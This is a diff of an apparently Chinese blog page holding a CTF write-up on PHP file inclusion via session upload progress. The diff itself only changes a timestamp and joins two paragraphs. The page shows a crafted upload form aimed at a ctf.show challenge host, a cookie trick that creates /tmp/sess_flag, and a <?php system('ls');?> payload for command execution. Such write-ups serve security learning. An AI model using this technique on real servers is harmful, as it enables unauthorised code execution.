@@ -170,7 +170,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2021-04-20 03:13:00 / Modified: 03:57:25" itemprop="dateCreated datePublished" datetime="2021-04-20T03:13:00+08:00">2021-04-20</time>
+              <time title="Created: 2021-04-20 03:13:00 / Modified: 03:59:24" itemprop="dateCreated datePublished" datetime="2021-04-20T03:13:00+08:00">2021-04-20</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -274,8 +274,7 @@
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://7781194c-e177-4542-945c-b06304458ece.challenge.ctf.show:8080/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>其中讲解一下hidden这个type，这个是一个“隐藏信息”，用户是看不到这样的信息的，但是他会被传入到目标网址。</p>
-<p>这个时候我们把它保存为一个网页文件，然后点击</p>
-<p>抓包，这里我们添加一个 Cookie :PHPSESSID=flag   ，PHP将会在服务器上创建一个文件：/tmp/sess_flag”  （这里我们猜测session文件默认存储位置为/tmp），并在PHP_SESSION_UPLOAD_PROGRESS下添加需要执行的php语句</p>
+<p>这个时候我们把它保存为一个网页文件，然后点击抓包，这里我们添加一个 Cookie :PHPSESSID=flag   ，PHP将会在服务器上创建一个文件：/tmp/sess_flag”  （这里我们猜测session文件默认存储位置为/tmp），并在PHP_SESSION_UPLOAD_PROGRESS下添加需要执行的php语句</p>
 <?php system('ls');?>
 
 <p><img src="%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.assets/image-20210420020922027.png"></p>
